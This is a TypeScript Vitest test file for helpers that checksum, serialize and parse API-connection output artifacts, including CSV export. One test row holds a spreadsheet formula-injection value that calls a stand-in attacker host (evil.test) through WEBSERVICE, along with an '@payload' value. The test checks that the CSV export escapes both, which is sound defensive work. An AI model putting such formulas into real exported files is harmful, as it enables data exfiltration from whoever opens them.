import { describe, expect, it } from "vitest";

import {
  checksumApiConnectionArtifact,
  parseApiConnectionRowsArtifact,
  parseApiConnectionRawChunkManifest,
  parseApiConnectionRowsChunkManifest,
  serializeApiConnectionRawResponseArtifact,
  serializeApiConnectionRowsArtifact,
  serializeApiConnectionRowsToCsv,
  UTF8_BOM,
} from "@/lib/api-connection-output";

const columns = [
  { key: "name", label: "Name", sourceIndex: 0 },
  { key: "notes", label: "Notes", sourceIndex: 1 },
];

const rows = [
  { name: "Alpha", notes: "Line one" },
  { name: "Beta", notes: "Line \"two\"\nwrapped" },
  { name: "=WEBSERVICE(\"https://evil.test\")", notes: "  @payload" },
];

describe("API connection output helpers", () => {
  it("produces deterministic SHA-256 artifact checksums", () => {
    expect(checksumApiConnectionArtifact("artifact")).toBe(
      "c7c5c1d70c5dec4416ab6158afd0b223ef40c29b1dc1f97ed9428b94d4cadb1c",
    );
    expect(checksumApiConnectionArtifact("artifact")).toBe(
      checksumApiConnectionArtifact("artifact"),
    );
  });

  it("serializes normalized rows as UTF-8 BOM CSV with CRLF rows", () => {
    expect(serializeApiConnectionRowsToCsv({ columns, rows })).toBe(
      `${UTF8_BOM}Name,Notes\r\nAlpha,Line one\r\nBeta,"Line ""two""\nwrapped"\r\n"'=WEBSERVICE(""https://evil.test"")",'  @payload\r\n`,
    );
  });

  it("round-trips normalized rows artifacts", () => {
    const sourceAdapter = {
      name: "imb-arcgis-replacement",
      version: "imb-arcgis-source-v2",
      checksum: "adapter-checksum",
    };
    const artifact = serializeApiConnectionRowsArtifact({
      columns,
      rows,
      sourceAdapter,
    });

    expect(parseApiConnectionRowsArtifact(artifact)).toEqual({
      columns,
      rows,
      sourceAdapter,
    });
  });

  it("serializes redacted raw response artifacts as JSON", () => {
    const artifact = serializeApiConnectionRawResponseArtifact({
      runId: "run-1",
      connectionId: "connection-1",
      mode: "test",
      responseFormat: "json",
      responseDataPath: "data",
      httpStatus: 200,
      rowCount: 2,
      rawResponse: "{\"secret\":\"[redacted]\"}",
    });

    expect(JSON.parse(artifact)).toMatchObject({
      runId: "run-1",
      rawResponse: "{\"secret\":\"[redacted]\"}",
    });
  });

  it("accepts only versioned durable chunk manifests", () => {
    expect(
      parseApiConnectionRowsChunkManifest(
        JSON.stringify({
          schemaVersion: 1,
          kind: "api-connection-rows-chunks",
          columns,
          rowCount: 3,
          chunks: [],
        }),
      ),
    ).toMatchObject({ rowCount: 3, chunks: [] });
    expect(
      parseApiConnectionRawChunkManifest(
        JSON.stringify({
          schemaVersion: 1,
          kind: "api-connection-raw-chunks",
          runId: "run-1",
          connectionId: "connection-1",
          mode: "test",
          responseFormat: "json",
          responseDataPath: "",
          httpStatus: 200,
          rowCount: 3,
          chunks: [],
        }),
      ),
    ).toMatchObject({ runId: "run-1", chunks: [] });
    expect(parseApiConnectionRowsChunkManifest("{}")).toBeNull();
  });
});
